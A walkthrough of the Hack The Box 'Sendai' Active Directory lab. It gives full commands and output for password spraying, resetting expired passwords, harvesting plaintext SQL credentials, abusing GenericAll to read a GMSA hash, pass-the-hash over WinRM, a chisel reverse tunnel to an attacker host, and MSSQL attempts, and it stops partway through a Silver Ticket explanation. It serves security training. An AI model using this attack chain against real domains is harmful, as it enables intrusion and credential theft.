---
categories:
- Hackthebox
image:
  path: Pasted image 20251021014633.png
layout: post
media_subpath: /assets/images/sendai
tags:
- hackthebox
- writeup
- windows
- active directory
- medium
- password spraying
- gmsa
- group managed service accounts(gmsa)
- silver ticket
- kerberos
- bloodhound
- bloodyad
- impacket
- mssql
- token impersonation
- godpotato
- lateral movement
- privilege escalation
- red team
title: Lab - Sendai Walkthrough
---

# Introduction

Sendai is a Windows Server 2022 domain controller that demonstrates multiple Active Directory attack vectors including password policy weaknesses, Group Managed Service Accounts (GMSA), and SQL Server privilege escalation. The attack path leads from anonymous SMB access to full domain compromise through a combination of password spraying, GMSA exploitation, and Silver Ticket attacks.
## Reconnaissance
### Port Scanning
I start off with a `nmap` scan to identify open ports 
```
nmap -sC -sV -oA nmap/Sendai 10.129.234.66  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-19 21:57 EAT
Nmap scan report for 10.129.234.66
Host is up (0.17s latency).
Not shown: 985 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-19 18:58:18Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sendai.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sendai.vl
| Not valid before: 2025-08-18T12:30:05
|_Not valid after:  2026-08-18T12:30:05
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_ssl-date: TLS randomness does not represent time
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: DNS:dc.sendai.vl
| Not valid before: 2023-07-18T12:39:21
|_Not valid after:  2024-07-18T00:00:00
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sendai.vl
| Not valid before: 2025-08-18T12:30:05
|_Not valid after:  2026-08-18T12:30:05
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sendai.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sendai.vl
| Not valid before: 2025-08-18T12:30:05
|_Not valid after:  2026-08-18T12:30:05
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sendai.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sendai.vl
| Not valid before: 2025-08-18T12:30:05
|_Not valid after:  2026-08-18T12:30:05
|_ssl-date: TLS randomness does not represent time
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=dc.sendai.vl
| Not valid before: 2025-10-18T17:23:29
|_Not valid after:  2026-04-19T17:23:29
|_ssl-date: 2025-10-19T18:59:41+00:00; +2s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
| smb2-time: 
|   date: 2025-10-19T18:59:05
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```
**Key Findings:**
- Standard AD ports: 53 (DNS), 88 (Kerberos), 135 (RPC), 139/445 (SMB), 389/636 (LDAP)
- Web services: 80/443 (IIS 10.0)
- Remote management: 5985 (WinRM), 3389 (RDP)
- Domain: `sendai.vl`
Added domain to hosts file for proper DNS resolution:
```
echo '10.129.234.66  dc.sendai.htb sendai.htb dc' | sudo tee -a /etc/hosts
```

### Web Enumeration
The IIS default page provides limited attack surface. 
![image](Pasted image 20251019220055.png)
Directory brute-forcing reveals a `/service` directory:
```
ffuf -u http://10.129.234.66/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -ic -e .aspx

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.234.66/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 :: Extensions       : .aspx 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 703, Words: 27, Lines: 32, Duration: 161ms]
service                 [Status: 301, Size: 152, Words: 9, Lines: 2, Duration: 189ms]
```
However, access to `/service` returns 401 Unauthorized.
![image](Pasted image 20251020230200.png)
The port on 443 is just the secured version of the site at 80 so their is no need of enumerating that
### SMB
Anonymous SMB access reveals several non-default shares:
```
nxc smb sendai.vl -u 'guest' -p '' --shares
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.66   445    DC               [+] sendai.vl\guest: 
SMB         10.129.234.66   445    DC               [*] Enumerated shares
SMB         10.129.234.66   445    DC               Share           Permissions     Remark
SMB         10.129.234.66   445    DC               -----           -----------     ------
SMB         10.129.234.66   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.66   445    DC               C$                              Default share
SMB         10.129.234.66   445    DC               config                          
SMB         10.129.234.66   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.66   445    DC               NETLOGON                        Logon server share 
SMB         10.129.234.66   445    DC               sendai          READ            company share
SMB         10.129.234.66   445    DC               SYSVOL                          Logon server share 
SMB         10.129.234.66   445    DC               Users           READ            
```
**Accessible Shares:**
- `sendai` (Read)
- `Users` (Read)
- `config` (Initially no access)
Exploring the `sendai` share reveals company structure and an incident report indicating password policy issues:

```
impacket-smbclient sendai.vl/'guest':''@sendai.vl -no-pass
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use sendai
# ls
drw-rw-rw-          0  Tue Jul 18 20:31:04 2023 .
drw-rw-rw-          0  Wed Apr 16 05:55:42 2025 ..
drw-rw-rw-          0  Tue Jul 11 16:26:34 2023 hr
-rw-rw-rw-       1372  Tue Jul 18 20:34:15 2023 incident.txt
drw-rw-rw-          0  Tue Jul 18 16:16:46 2023 it
drw-rw-rw-          0  Tue Jul 11 16:26:34 2023 legal
drw-rw-rw-          0  Tue Jul 18 16:17:35 2023 security
drw-rw-rw-          0  Tue Jul 11 16:26:34 2023 transfer
# get incident.txt
```
The `incident.txt` file reveals that many user accounts had weak passwords and were expired, requiring password changes.
```
cat incident.txt 
Dear valued employees,

We hope this message finds you well. We would like to inform you about an important security update regarding user account passwords. Recently, we conducted a thorough penetration test, which revealed that a significant number of user accounts have weak and insecure passwords.

To address this concern and maintain the highest level of security within our organization, the IT department has taken immediate action. All user accounts with insecure passwords have been expired as a precautionary measure. This means that affected users will be required to change their passwords upon their next login.

We kindly request all impacted users to follow the password reset process promptly to ensure the security and integrity of our systems. Please bear in mind that strong passwords play a crucial role in safeguarding sensitive information and protecting our network from potential threats.

If you need assistance or have any questions regarding the password reset procedure, please don't hesitate to reach out to the IT support team. They will be more than happy to guide you through the process and provide any necessary support.

Thank you for your cooperation and commitment to maintaining a secure environment for all of us. Your vigilance and adherence to robust security practices contribute significantly to our collective safety.            
```

## Initial Access
### User Enumeration
RID brute-forcing reveals domain users:
```
nxc smb sendai.vl -u guest -p '' --rid-brute                         
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.66   445    DC               [+] sendai.vl\guest: 
SMB         10.129.234.66   445    DC               498: SENDAI\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.66   445    DC               500: SENDAI\Administrator (SidTypeUser)
SMB         10.129.234.66   445    DC               501: SENDAI\Guest (SidTypeUser)
SMB         10.129.234.66   445    DC               502: SENDAI\krbtgt (SidTypeUser)
SMB         10.129.234.66   445    DC               512: SENDAI\Domain Admins (SidTypeGroup)
SMB         10.129.234.66   445    DC               513: SENDAI\Domain Users (SidTypeGroup)
SMB         10.129.234.66   445    DC               514: SENDAI\Domain Guests (SidTypeGroup)
SMB         10.129.234.66   445    DC               515: SENDAI\Domain Computers (SidTypeGroup)
SMB         10.129.234.66   445    DC               516: SENDAI\Domain Controllers (SidTypeGroup)
SMB         10.129.234.66   445    DC               517: SENDAI\Cert Publishers (SidTypeAlias)
SMB         10.129.234.66   445    DC               518: SENDAI\Schema Admins (SidTypeGroup)
SMB         10.129.234.66   445    DC               519: SENDAI\Enterprise Admins (SidTypeGroup)
SMB         10.129.234.66   445    DC               520: SENDAI\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.234.66   445    DC               521: SENDAI\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.66   445    DC               522: SENDAI\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.234.66   445    DC               525: SENDAI\Protected Users (SidTypeGroup)
SMB         10.129.234.66   445    DC               526: SENDAI\Key Admins (SidTypeGroup)
SMB         10.129.234.66   445    DC               527: SENDAI\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.234.66   445    DC               553: SENDAI\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.234.66   445    DC               571: SENDAI\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.66   445    DC               572: SENDAI\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.66   445    DC               1000: SENDAI\DC$ (SidTypeUser)
SMB         10.129.234.66   445    DC               1101: SENDAI\DnsAdmins (SidTypeAlias)
SMB         10.129.234.66   445    DC               1102: SENDAI\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.234.66   445    DC               1103: SENDAI\SQLServer2005SQLBrowserUser$DC (SidTypeAlias)
SMB         10.129.234.66   445    DC               1104: SENDAI\sqlsvc (SidTypeUser)
SMB         10.129.234.66   445    DC               1105: SENDAI\websvc (SidTypeUser)
SMB         10.129.234.66   445    DC               1107: SENDAI\staff (SidTypeGroup)
SMB         10.129.234.66   445    DC               1108: SENDAI\Dorothy.Jones (SidTypeUser)
SMB         10.129.234.66   445    DC               1109: SENDAI\Kerry.Robinson (SidTypeUser)
SMB         10.129.234.66   445    DC               1110: SENDAI\Naomi.Gardner (SidTypeUser)
SMB         10.129.234.66   445    DC               1111: SENDAI\Anthony.Smith (SidTypeUser)
SMB         10.129.234.66   445    DC               1112: SENDAI\Susan.Harper (SidTypeUser)
SMB         10.129.234.66   445    DC               1113: SENDAI\Stephen.Simpson (SidTypeUser)
SMB         10.129.234.66   445    DC               1114: SENDAI\Marie.Gallagher (SidTypeUser)
SMB         10.129.234.66   445    DC               1115: SENDAI\Kathleen.Kelly (SidTypeUser)
SMB         10.129.234.66   445    DC               1116: SENDAI\Norman.Baxter (SidTypeUser)
SMB         10.129.234.66   445    DC               1117: SENDAI\Jason.Brady (SidTypeUser)
SMB         10.129.234.66   445    DC               1118: SENDAI\Elliot.Yates (SidTypeUser)
SMB         10.129.234.66   445    DC               1119: SENDAI\Malcolm.Smith (SidTypeUser)
SMB         10.129.234.66   445    DC               1120: SENDAI\Lisa.Williams (SidTypeUser)
SMB         10.129.234.66   445    DC               1121: SENDAI\Ross.Sullivan (SidTypeUser)
SMB         10.129.234.66   445    DC               1122: SENDAI\Clifford.Davey (SidTypeUser)
SMB         10.129.234.66   445    DC               1123: SENDAI\Declan.Jenkins (SidTypeUser)
SMB         10.129.234.66   445    DC               1124: SENDAI\Lawrence.Grant (SidTypeUser)
SMB         10.129.234.66   445    DC               1125: SENDAI\Leslie.Johnson (SidTypeUser)
SMB         10.129.234.66   445    DC               1126: SENDAI\Megan.Edwards (SidTypeUser)
SMB         10.129.234.66   445    DC               1127: SENDAI\Thomas.Powell (SidTypeUser)
SMB         10.129.234.66   445    DC               1128: SENDAI\ca-operators (SidTypeGroup)
SMB         10.129.234.66   445    DC               1129: SENDAI\admsvc (SidTypeGroup)
SMB         10.129.234.66   445    DC               1130: SENDAI\mgtsvc$ (SidTypeUser)
SMB         10.129.234.66   445    DC               1131: SENDAI\support (SidTypeGroup)
```
### Password Spraying
I save the list of valid users to a file and attempt a password brute force with username as password and fail
```
nxc smb sendai.vl -u valid_users -p valid_users --no-brute --continue-on-success
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.66   445    DC               [-] sendai.vl\Administrator:Administrator STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Guest:Guest STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\krbtgt:krbtgt STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\DC$:DC$ STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\sqlsvc:sqlsvc STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\websvc:websvc STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Dorothy.Jones:Dorothy.Jones STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Kerry.Robinson:Kerry.Robinson STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Naomi.Gardner:Naomi.Gardner STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Anthony.Smith:Anthony.Smith STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Susan.Harper:Susan.Harper STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Stephen.Simpson:Stephen.Simpson STATUS_LOGON_FAILURE
SMB         10.129.234.66   445    DC               [-] sendai.vl\Marie.Gallagher:Marie.Gallagher STATUS_LOGON_FAILURE
SMB         10.129.234.66   445    DC               [-] sendai.vl\Kathleen.Kelly:Kathleen.Kelly STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Norman.Baxter:Norman.Baxter STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Jason.Brady:Jason.Brady STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Elliot.Yates:Elliot.Yates STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Malcolm.Smith:Malcolm.Smith STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Lisa.Williams:Lisa.Williams STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Ross.Sullivan:Ross.Sullivan STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Clifford.Davey:Clifford.Davey STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Declan.Jenkins:Declan.Jenkins STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Lawrence.Grant:Lawrence.Grant STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Leslie.Johnson:Leslie.Johnson STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Megan.Edwards:Megan.Edwards STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Thomas.Powell:Thomas.Powell STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\mgtsvc$:mgtsvc$ STATUS_LOGON_FAILURE
```
Testing with empty passwords identifies two users requiring password changes:
```
nxc smb sendai.vl -u valid_users -p '' --no-brute --continue-on-success
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.66   445    DC               [-] sendai.vl\Administrator: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [+] sendai.vl\Guest: 
SMB         10.129.234.66   445    DC               [-] sendai.vl\krbtgt: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\DC$: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\sqlsvc: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\websvc: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Dorothy.Jones: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Kerry.Robinson: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Naomi.Gardner: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Anthony.Smith: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Susan.Harper: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Stephen.Simpson: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Marie.Gallagher: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Kathleen.Kelly: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Norman.Baxter: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Jason.Brady: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Elliot.Yates: STATUS_PASSWORD_MUST_CHANGE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Malcolm.Smith: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Lisa.Williams: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Ross.Sullivan: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Clifford.Davey: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Declan.Jenkins: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Lawrence.Grant: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Leslie.Johnson: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Megan.Edwards: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Thomas.Powell: STATUS_PASSWORD_MUST_CHANGE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\mgtsvc$: STATUS_LOGON_FAILURE 
```
**Affected Users:**
- `Elliot.Yates` (STATUS_PASSWORD_MUST_CHANGE)
- `Thomas.Powell` (STATUS_PASSWORD_MUST_CHANGE)

### Password Reset
Using `impacket-changepasswd` to reset passwords for the affected accounts:
```
impacket-changepasswd sendai.vl/Elliot.Yates:''@sendai.vl
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Current password: 
New password: 
Retype new password: 
[*] Changing the password of sendai.vl\Elliot.Yates
[*] Connecting to DCE/RPC as sendai.vl\Elliot.Yates
[!] Password is expired or must be changed, trying to bind with a null session.
[*] Connecting to DCE/RPC as null session
[*] Password was changed successfully.

impacket-changepasswd sendai.vl/Thomas.Powell:''@sendai.vl
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Current password: 
New password: 
Retype new password: 
[*] Changing the password of sendai.vl\Thomas.Powell
[*] Connecting to DCE/RPC as sendai.vl\Thomas.Powell
[!] Password is expired or must be changed, trying to bind with a null session.
[*] Connecting to DCE/RPC as null session
[*] Password was changed successfully.
```

### Expanded SMB Access
With valid credentials, additional SMB shares become accessible:
```
nxc smb sendai.vl -u 'Elliot.Yates' -p 'Pass!@#' --shares
SMB         10.129.77.37    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)
SMB         10.129.77.37    445    DC               [+] sendai.vl\Elliot.Yates:Pass!@# 
SMB         10.129.77.37    445    DC               [*] Enumerated shares
SMB         10.129.77.37    445    DC               Share           Permissions     Remark
SMB         10.129.77.37    445    DC               -----           -----------     ------
SMB         10.129.77.37    445    DC               ADMIN$                          Remote Admin
SMB         10.129.77.37    445    DC               C$                              Default share
SMB         10.129.77.37    445    DC               config          READ,WRITE      
SMB         10.129.77.37    445    DC               IPC$            READ            Remote IPC
SMB         10.129.77.37    445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.77.37    445    DC               sendai          READ,WRITE      company share
SMB         10.129.77.37    445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.77.37    445    DC               Users           READ            
```
Now have Read/Write access to `config` share.
### Credential Discovery
The `config` share contains a SQL configuration file with credentials:
```
impacket-smbclient sendai.vl/Elliot.Yates:'Pass!@#'@sendai.vl
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use config
# ls
drw-rw-rw-          0  Mon Oct 20 23:24:08 2025 .
drw-rw-rw-          0  Wed Apr 16 05:55:42 2025 ..
-rw-rw-rw-         78  Tue Jul 11 15:57:10 2023 .sqlconfig
# get .sqlconfig
```
**Credentials Found:**
- Username: `sqlsvc`
- Password: `SurenessBlob85`
Credentials validated successfully:
```
nxc smb sendai.vl -u sqlsvc -p 'SurenessBlob85' 
SMB         10.129.77.37    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)
SMB         10.129.77.37    445    DC               [+] sendai.vl\sqlsvc:SurenessBlob85 
```

## Lateral Movement
### BloodHound Analysis
Dumping BloodHound data for path analysis:
```
bloodhound-python -u sqlsvc -p SurenessBlob85 -d sendai.vl -c All --zip -ns 10.129.234.66
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: sendai.vl
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.sendai.vl
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.sendai.vl
INFO: Found 27 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 5 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.sendai.vl
cINFO: Done in 00M 45S
INFO: Compressing output into 20251020233839_bloodhound.zip
```
Then I stared up `bloodhound` and uploaded my zip file. Then looking at the 2 users that I had initially owned I get this attack chain
![image](Pasted image 20251020234149.png)
This is a valid attack chain since `MGTSVC$` is part of remote management hence will have access to `winrm`. And also I identify this user and the one that is vulnerable to `kerebroasing`
![image](Pasted image 20251020234446.png)

**Attack Path Identified:**  
`Elliot.Yates` → GenericAll on `admsvc` group → `admsvc` group membership → Read GMSA password for `mgtsvc$`

### GMSA Exploitation
#### Step 1: Grant GenericAll Privileges
Using `bloodyAD` to grant `Elliot.Yates` GenericAll over the `admsvc` group:
```
bloodyAD -u Elliot.Yates -p 'Pass!@#' -d sendai.vl --dc-ip 10.129.234.66 add genericAll admsvc Elliot.Yates
[+] Elliot.Yates has now GenericAll on admsvc
```
#### Step 2: Add to admsvc Group
Adding `Elliot.Yates` to the `admsvc` group:
```
bloodyAD -u Elliot.Yates -p 'Pass!@#' -d sendai.vl --dc-ip 10.129.77.37 add groupMember admsvc Elliot.Yates
[+] Elliot.Yates added to admsvc
```

#### Step 3: Retrieve GMSA Password
Reading the GMSA password for `mgtsvc$`:
```
nxc ldap sendai.vl -u Elliot.Yates -p 'Pass!@#' --gmsa
LDAP        10.129.77.37    389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl)
LDAPS       10.129.77.37    636    DC               [+] sendai.vl\Elliot.Yates:Pass!@# 
LDAPS       10.129.77.37    636    DC               [*] Getting GMSA Passwords
LDAPS       10.129.77.37    636    DC               Account: mgtsvc$              NTLM: eb19b37b20218824d3c29f753fd5f607     PrincipalsAllowedToReadPassword: admsvc
```

### WinRM Access
Using the GMSA hash to access the system via WinRM:
```
evil-winrm -i sendai.vl -u 'mgtsvc$' -H eb19b37b20218824d3c29f753fd5f607
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\mgtsvc$\Documents> 
```
User flag located at: `C:\user.txt`
## Privilege Escalation
### SQL Server Discovery
Internal port scanning reveals SQL Server running on localhost:
```
*Evil-WinRM* PS C:\> netstat -ano | findstr "LISTENING" | findstr 1433
  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       988
  TCP    [::]:1433              [::]:0                 LISTENING       988
```
### Port Forwarding with Chisel
Setting up SOCKS5 tunnel to access the internal SQL Server:
**Attacker (Server):**
```
chisel server --reverse -p 8002 --socks5
2025/10/21 00:13:13 server: Reverse tunnelling enabled
2025/10/21 00:13:13 server: Fingerprint OF1WYvpFDpjAhbUrCRhkPv1wBkRgBqVx9X8UP9Me85M=
2025/10/21 00:13:13 server: Listening on http://0.0.0.0:8002
```
**Target (Client):**
```
*Evil-WinRM* PS C:\programdata> .\chisel.exe client --fingerprint OF1WYvpFDpjAhbUrCRhkPv1wBkRgBqVx9X8UP9Me85M= 10.10.14.210:8002 R:socks
chisel.exe : 2025/10/20 14:24:16 client: Connecting to ws://10.10.14.210:8002
    + CategoryInfo          : NotSpecified: (2025/10/20 14:2....10.14.210:8002:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
2025/10/20 14:24:17 client: Fingerprint OF1WYvpFDpjAhbUrCRhkPv1wBkRgBqVx9X8UP9Me85M=2025/10/20 14:24:18 client: Connected (Latency 204.8217ms)
```
### SQL Server Access Attempt
Initial connection with `sqlsvc` credentials shows limited privileges:
```
proxychains impacket-mssqlclient  sendai.vl/sqlsvc:SurenessBlob85@localhost -windows-auth 
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:1433  ...  OK
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (SENDAI\sqlsvc  guest@master)> xp_cmdshell whoami
ERROR(DC\SQLEXPRESS): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
SQL (SENDAI\sqlsvc  guest@master)> enable_xp_cmdshell
ERROR(DC\SQLEXPRESS): Line 105: User does not have permission to perform this action.
ERROR(DC\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC\SQLEXPRESS): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
ERROR(DC\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
SQL (SENDAI\sqlsvc  guest@master)> 
```
Cannot enable `xp_cmdshell` due to insufficient privileges.
Also their was no interesting databases in play
```
SQL (SENDAI\sqlsvc  guest@master)> enum_db
name     is_trustworthy_on   
------   -----------------   
master                   0   

tempdb                   0   

model                    0   

msdb                     1   

SQL (SENDAI\sqlsvc  guest@master)>
```
### Silver Ticket Attack
#### Understanding Silver Tickets
**What is a Silver Ticket?**  
A Silver Ticket is a forged Kerberos service ticket that allows an attacker to authenticate to a specific service without interacting with the Domain Controller. Unlike Golden Tickets that target the entire domain, Silver Tickets are service-specific.

**How Silver Tickets Work:**
1. **Service Authentication**: When a user accesses a service (like SQL Server), they present a Ticket Granting Service (TGS) ticket
